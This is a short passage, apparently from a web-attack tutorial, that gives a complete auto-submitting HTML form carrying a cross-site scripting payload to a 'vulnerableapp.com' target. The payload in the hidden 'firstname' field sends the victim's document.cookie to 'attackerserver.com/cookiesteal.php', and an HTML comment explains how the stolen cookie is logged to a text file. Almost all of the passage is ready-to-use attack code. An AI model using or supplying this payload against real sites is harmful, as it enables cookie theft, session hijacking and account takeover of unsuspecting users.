 the payload is passed within the form value:


 <body onload="document.myForm.submit()">

 <form method="GET" action="http://vulnerableapp.com" name="myForm">

 <input type=hidden name="firstname"  value="<script>document.location='http://attackerserver.com/cookiesteal.php?c='+document.cookie; <></script>"/>
 <input type=hidden name="lastname"  value="hello hacker"/>
 <input type=hidden name="form"  value="submit"/>

 <!-- this is a autosubmit form with two parameters. you can modify the parameters according to the need.
 In the form action parameter, address of the XSS vunerable application is passed.

 In the payload i.e. the first input parameter attacker server's location is passed where the stealed cookie will be passed to a php
 file and further write in a txt file-->
 </form>
